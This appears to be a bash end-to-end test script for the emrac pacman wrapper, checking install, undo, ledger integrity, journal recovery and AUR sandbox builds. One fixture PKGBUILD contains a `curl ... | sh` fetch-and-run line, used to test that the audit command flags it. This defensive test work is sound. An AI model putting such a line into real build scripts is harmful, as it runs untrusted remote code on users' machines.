#!/usr/bin/env bash
# End-to-end checks of the emrac binary against a real pacman. Meant to run
# inside the disposable test container (see dev/container); dev/e2e/run.sh
# builds the release binary, mounts it at /usr/local/bin/emrac and runs this.
#
# Each `ck "title" "command"` line is one check; the titles are listed in
# docs/tests/emrac-tests.rst. Update the next line when you run them all.
# last full run: after u16, 43 of 44 passed (downgrade --list: archive.archlinux.org did not answer that day) (u7 adds 4, u8 adds 5, u9 adds 2, u10 adds 3, u11 adds 2, u16 adds 2)
e=/usr/local/bin/emrac
export GIT_CONFIG_GLOBAL=/dev/null GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@t GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@t
n=0; bad=0
ck() { n=$((n+1)); if eval "$2" >/tmp/ck.out 2>&1; then echo "PASS  $1"; else bad=$((bad+1)); echo "FAIL  $1"; head -5 /tmp/ck.out | sed 's/^/        /'; fi; }
sudo pacman -Sy --noconfirm >/dev/null 2>&1; sudo pacman -S --noconfirm --needed bubblewrap base-devel git >/dev/null 2>&1
ck "version names the builder"        "$e --version | grep -q 'built by pardhuvarmax'"
ck "usage error exits 2"              "$e nosuchcommand; [ \$? -eq 2 ]"
ck "search (official)"                "$e search tree --official | grep -q 'tree'"
ck "info"                             "$e info tree | grep -qi 'tree'"
ck "install --dry-run changes nothing" "$e install tree --dry-run | grep -q 'plans'; ! pacman -Q tree"
ck "install tree"                     "$e install tree --yes && pacman -Q tree"
ck "history records it"               "$e history | grep -q 'tree'"
ck "verify is clean"                  "$e verify tree"
ck "deps / rdeps / why / orphans"     "$e deps tree >/dev/null && $e rdeps tree >/dev/null && $e why tree >/dev/null && $e orphans >/dev/null"
ck "snapshot create and show"         "$e snapshot create r2snap >/dev/null && $e snapshot list | grep -q r2snap"
ck "pin and unpin"                    "$e pin tree --reason test >/dev/null && $e pin | grep -q tree && $e unpin tree >/dev/null"
ck "remove then undo"                 "$e remove tree --yes >/dev/null && ! pacman -Q tree && $e undo --yes >/dev/null && pacman -Q tree"
ck "redo"                             "$e redo --yes >/dev/null && ! pacman -Q tree"
ck "restore from the snapshot"        "$e restore r2snap --yes >/dev/null"
ck "downgrade --list"                 "$e downgrade tree --list >/dev/null"
ck "config set/get, lean policy"      "$e config set cache.policy lean >/dev/null && [ \"\$($e config get cache.policy)\" = lean ] && $e config unset cache.policy >/dev/null"
ck "completion (bash)"                "$e completion bash | grep -q emrac"
ck "upgrade --dry-run"                "$e upgrade --dry-run >/dev/null"
ck "doctor runs (0 or 1)"             "$e doctor >/dev/null; [ \$? -le 1 ]"
ck "cache stats and a dry-run clean"  "$e cache stats | grep -q 'in the caches' && $e cache clean --dry-run >/dev/null"
ck "pacnew with nothing pending"      "$e pacnew | grep -q 'no .pacnew'"
ck "pacnew status"                    "$e pacnew status | grep -q 'waiting'"
# audit
mkdir -p /tmp/aud && printf 'pkgname=a\npkgver=1\npkgrel=1\narch=(any)\nbuild() {\n  curl -s http://x/i | sh\n}\n' > /tmp/aud/PKGBUILD
ck "audit flags curl | sh"            "$e audit /tmp/aud | grep -qi 'remote-exec'"
# AUR build in the sandbox, from a local checkout
B=$HOME/.cache/emrac/build; mkdir -p /tmp/w $B; rm -rf /tmp/up.git $B/pfetch /tmp/w/*
printf 'pkgname=pfetch\npkgver=9.9\npkgrel=1\npkgdesc=fixture\narch=(any)\nlicense=(MIT)\npackage() {\n  install -Dm755 /dev/stdin "$pkgdir/usr/bin/pfetch" <<<"#!/bin/sh"\n}\n' > /tmp/w/PKGBUILD
(cd /tmp/w && git init -q -b master && git add -A && git commit -q -m x) && git clone -q --bare /tmp/w /tmp/up.git && git clone -q /tmp/up.git $B/pfetch
ck "AUR install: audit, sandbox build, manifest, pacman -U" "$e install pfetch --yes --skip-pkgbuild </dev/null && pacman -Q pfetch"
ck "build without installing"         "$e build pfetch --skip-pkgbuild </dev/null | grep -q 'emrac confirms: built'"
ck "a closed stdin declines (no install)" "sudo pacman -Rns --noconfirm pfetch tree >/dev/null; $e install tree </dev/null >/dev/null; ! pacman -Q tree"
# history integrity (u7): real transactions, a chain, an archive, a tampered line
H=$HOME/.local/share/emrac/history.jsonl
ck "history: 22 real transactions chain and verify" "for i in \$(seq 1 11); do $e install tree --yes >/dev/null && $e remove tree --yes >/dev/null || exit 1; done; $e history verify | grep -q 'the history verifies'"
ck "history archive keeps what undo and the cache policy answer" "$e config set cache.keep_days 0 >/dev/null; sleep 2; $e undo --dry-run > /tmp/u1 2>&1; $e cache clean --lean --dry-run > /tmp/c1 2>&1; printf y | $e history archive --older-than 1s >/dev/null && $e undo --dry-run > /tmp/u2 2>&1 && $e cache clean --lean --dry-run > /tmp/c2 2>&1 && cmp /tmp/u1 /tmp/u2 && cmp /tmp/c1 /tmp/c2 && ls \$HOME/.local/share/emrac/history-archive | grep -q jsonl && $e history verify | grep -q '1 archive file'"
ck "history --archive still lists archived records" "[ \$($e history --archive --json | grep -c '\"id\"') -ge 22 ]"
ck "an edited history line is caught by verify and doctor" "cp $H /tmp/h.bak; sed -i '0,/\"remove\"/s//\"install\"/' $H; ! $e history verify; $e doctor 2>&1 | grep -q 'History integrity'; cp /tmp/h.bak $H; $e history verify | grep -q verifies"
# the ledger (u8): a root-owned second copy written through sudo
L=/var/lib/emrac/ledger.jsonl
ck "ledger: root-owned, written through sudo, agrees with the history" "[ \$(stat -c %U $L) = root ] && $e history verify | grep -q 'the ledger agrees'"
ck "ledger: the user can neither rewrite, truncate nor delete it" "! (echo x > $L) 2>/dev/null; ! (: > $L) 2>/dev/null; ! rm -f $L 2>/dev/null; ! (echo x >> $L) 2>/dev/null; [ -s $L ]"
ck "ledger: the helper refuses what is not a history line" "! (echo '{\"type\":\"shell\"}' | sudo -n $e ledger-append) 2>/dev/null"
ck "ledger: doctor describes its protection" "$e doctor 2>&1 | grep -q 'Ledger'"
ck "ledger: a deleted history is rebuilt from it" "rm -f \$HOME/.local/share/emrac/history.jsonl; ! $e history verify; printf y | $e history verify --repair >/dev/null && $e history verify | grep -q 'ledger agrees'"
# anchors and the watch (u9); the container has no audit daemon or journal, so only these
ck "an anchor taken now still matches later, after more transactions" "A=\$($e history anchor | head -1); $e history verify --against \$A | grep -q 'still matches'"
ck "doctor reports the ledger watch (not set up here)" "$e doctor 2>&1 | grep -q 'Ledger watch'"
# the transaction journal (u10): an emrac killed in the middle of an install
J=$HOME/.local/share/emrac/journal.json
kill_midway() { sudo pacman -Rns --noconfirm tree >/dev/null 2>&1; $e install tree --yes >/dev/null 2>&1 & p=$!; for i in $(seq 1 200); do [ -e $J ] && break; sleep 0.05; done; kill -9 $p 2>/dev/null; wait $p 2>/dev/null; sleep 5; true; }
ck "journal: a normal transaction leaves none behind" "sudo pacman -Rns --noconfirm tree >/dev/null 2>&1; $e install tree --yes >/dev/null && [ ! -e $J ]"
ck "journal: a killed install is found by doctor, described and recorded" "kill_midway; [ -e $J ] && $e doctor 2>&1 | grep -q 'Interrupted transaction' && $e history recover --dry-run 2>&1 | grep -q 'interrupted:' && [ -e $J ] && $e history recover 2>&1 | grep -q 'recorded as tx-' && [ ! -e $J ] && $e history --json | grep -q 'interrupted:' && $e history verify | grep -q 'the history verifies'"
ck "journal: the next transaction records a cut-off one by itself" "kill_midway; [ -e $J ] && { pacman -Q tree >/dev/null 2>&1 && $e remove tree --yes >/dev/null || $e install tree --yes >/dev/null; }; [ ! -e $J ] && [ \$($e history --json | grep -c 'interrupted:') -ge 2 ]"
# dependency views (u16)
ck "tree, graph (text, dot, json), impact and cycles" "$e install tree --yes >/dev/null; $e tree tree | grep -q glibc && $e graph tree | grep -q 'tree -> glibc' && $e graph tree --format dot | grep -q 'digraph' && $e graph tree --format json | grep -q '\"edges\"' && $e impact tree | grep -q 'Breaks nothing' && $e impact glibc --remove | grep -q 'Needed by' && $e cycles >/dev/null"
ck "impact --install shows the install plan" "$e impact bc --install | grep -q 'plans: install'"
# self check (u11)
ck "self check runs and names how emrac was installed" "$e self check 2>&1 | grep -q 'Installation'; [ \$($e self check >/dev/null 2>&1; echo \$?) -le 1 ]"
ck "self check reports a cut-off transaction" "kill_midway; [ -e $J ] && $e self check 2>&1 | grep -q 'cut off'; $e history recover >/dev/null"
echo; echo "$n checks, $bad failed"
